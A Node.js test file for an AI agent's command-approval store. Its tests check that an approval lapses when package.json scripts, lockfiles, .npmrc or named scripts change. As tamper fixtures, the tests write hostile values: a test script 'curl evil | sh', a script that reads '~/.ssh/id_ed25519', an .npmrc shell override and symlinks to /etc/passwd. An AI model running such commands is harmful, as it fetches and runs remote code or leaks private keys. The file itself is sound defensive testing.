// Approval records of named commands (src/agent/command-approvals.js): a
// record holds only for the same command line with the same inputs.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import {
  APPROVAL_LIMITS,
  approvalKey,
  approvalsDir,
  createApprovalStore,
  inputsDigest,
  namedFiles,
} from '../src/agent/command-approvals.js'

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sw-approvals-'))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }))
  fs.writeFileSync(path.join(root, 'package-lock.json'), '{}')
  fs.mkdirSync(path.join(root, 'src'))
  fs.writeFileSync(path.join(root, 'src', 'app.js'), 'export const a = 1\n')
  fs.mkdirSync(path.join(root, 'bin'))
  fs.writeFileSync(path.join(root, 'bin', 'run-tests'), '#!/bin/sh\nnpm test\n', { mode: 0o755 })
  return root
}
const npmTest = { name: 'test', run: 'npm test', argv: ['npm', 'test'], inputs: null }

test('changing package.json, or the lockfile, changes the inputs', (t) => {
  const root = fixture(t)
  const before = inputsDigest(root, npmTest)
  assert.equal(inputsDigest(root, npmTest), before, 'stable')
  // Source files are not inputs of npm test by default: editing them is the fix itself.
  fs.writeFileSync(path.join(root, 'src', 'app.js'), 'export const a = 2\n')
  assert.equal(inputsDigest(root, npmTest), before)
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }))
  const changed = inputsDigest(root, npmTest)
  assert.notEqual(changed, before)
  fs.writeFileSync(path.join(root, 'package-lock.json'), '{"x":1}')
  assert.notEqual(inputsDigest(root, npmTest), changed)
})

test('a relative program is an input: changing ./bin/run-tests asks again', (t) => {
  const root = fixture(t)
  const command = { name: 'test', run: './bin/run-tests', argv: ['./bin/run-tests'], inputs: null }
  assert.deepEqual(namedFiles(command.argv), ['bin/run-tests'])
  const before = inputsDigest(root, command)
  fs.writeFileSync(path.join(root, 'bin', 'run-tests'), '#!/bin/sh\ncat ~/.ssh/id_ed25519\n', { mode: 0o755 })
  assert.notEqual(inputsDigest(root, command), before)
  // Its mode counts too.
  const now = inputsDigest(root, command)
  fs.chmodSync(path.join(root, 'bin', 'run-tests'), 0o644)
  assert.notEqual(inputsDigest(root, command), now)
  // A link counts as where it points, never followed.
  fs.rmSync(path.join(root, 'bin', 'run-tests'))
  fs.symlinkSync('/etc/hostname', path.join(root, 'bin', 'run-tests'))
  const linked = inputsDigest(root, command)
  fs.rmSync(path.join(root, 'bin', 'run-tests'))
  fs.symlinkSync('/etc/passwd', path.join(root, 'bin', 'run-tests'))
  assert.notEqual(inputsDigest(root, command), linked)
})

test('named scripts are inputs; flags and absolute paths are not', () => {
  assert.deepEqual(namedFiles(['node', 'scripts/check.mjs', '--fast', '/usr/bin/x', 'test.py', '../outside.js']), [
    'scripts/check.mjs',
    'test.py',
  ])
  assert.deepEqual(namedFiles(['npm', 'test']), [])
  assert.deepEqual(namedFiles(['bin/x']), ['bin/x'])
})

test('`inputs` globs add to the manifests, lockfiles and .npmrc, never replace them', (t) => {
  const root = fixture(t)
  const command = { ...npmTest, inputs: ['src/**'] }
  let before = inputsDigest(root, command)
  fs.writeFileSync(path.join(root, 'src', 'app.js'), 'changed\n')
  assert.notEqual(inputsDigest(root, command), before)
  // Review repro: explicit inputs ["test/**"] left package.json scripts and .npmrc out of the key.
  before = inputsDigest(root, command)
  fs.writeFileSync(path.join(root, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}')
  assert.notEqual(inputsDigest(root, command), before)
  before = inputsDigest(root, command)
  fs.writeFileSync(path.join(root, '.npmrc'), 'script-shell=/tmp/x\n')
  assert.notEqual(inputsDigest(root, command), before)
})

test('the key names where it ran: tier, session mode, network and read only', () => {
  const entry = { scope: 's', name: 'test', run: 'npm test', inputs: 'abc', tier: 'solo', mode: 'sandboxed', network: 'none', readOnly: true }
  const key = approvalKey(entry)
  for (const change of [{ tier: 'team' }, { mode: 'host-shell' }, { network: 'registries' }, { readOnly: false }])
    assert.notEqual(approvalKey({ ...entry, ...change }), key, JSON.stringify(change))
})

test('a record holds for the same scope, name, line and inputs only', (t) => {
  const root = fixture(t)
  const dir = path.join(root, '.records')
  let clock = Date.now()
  const store = createApprovalStore(dir, { now: () => clock })
  const entry = { scope: 'board-a', name: 'test', run: 'npm test', inputs: inputsDigest(root, npmTest) }
  assert.equal(store.has(entry), false)
  store.remember(entry)
  assert.equal(store.has(entry), true)
  assert.equal((fs.statSync(dir).mode & 0o777).toString(8), '700')
  for (const name of fs.readdirSync(dir)) assert.equal((fs.statSync(path.join(dir, name)).mode & 0o777).toString(8), '600')
  // The command line changed in the config.
  assert.equal(store.has({ ...entry, run: 'npm test -- --watch' }), false)
  // package.json changed.
  fs.writeFileSync(path.join(root, 'package.json'), '{"scripts":{"test":"node evil.js"}}')
  assert.equal(store.has({ ...entry, inputs: inputsDigest(root, npmTest) }), false)
  // Another board, another name.
  assert.equal(store.has({ ...entry, scope: 'board-b' }), false)
  assert.equal(store.has({ ...entry, name: 'build' }), false)
  // A record too old does not count, and is swept.
  clock += APPROVAL_LIMITS.keepMs + 1000
  fs.utimesSync(
    path.join(dir, fs.readdirSync(dir)[0]),
    new Date(clock - APPROVAL_LIMITS.keepMs - 1000),
    new Date(clock - APPROVAL_LIMITS.keepMs - 1000),
  )
  assert.equal(store.has(entry), false)
  store.sweep()
  assert.deepEqual(fs.readdirSync(dir), [])
})

test('a forged record under another key does not count', (t) => {
  const root = fixture(t)
  const dir = path.join(root, '.records')
  const store = createApprovalStore(dir)
  const entry = { scope: 's', name: 'test', run: 'npm test', inputs: 'abc' }
  fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(path.join(dir, `ca_${approvalKey(entry)}.json`), JSON.stringify({ key: 'something-else' }))
  assert.equal(store.has(entry), false)
})

test('records live under XDG_STATE_HOME, per connection', () => {
  assert.equal(
    approvalsDir('my-agent', { HOME: '/h', XDG_STATE_HOME: '/state' }),
    path.join('/state', 'shapewall', 'approvals', 'my-agent'),
  )
  assert.equal(
    approvalsDir('x', { HOME: '/h', XDG_STATE_HOME: 'relative' }),
    path.join('/h', '.local', 'state', 'shapewall', 'approvals', 'x'),
  )
  assert.equal(approvalsDir('../escape', { HOME: '/h' }), path.join('/h', '.local', 'state', 'shapewall', 'approvals', 'default'))
})
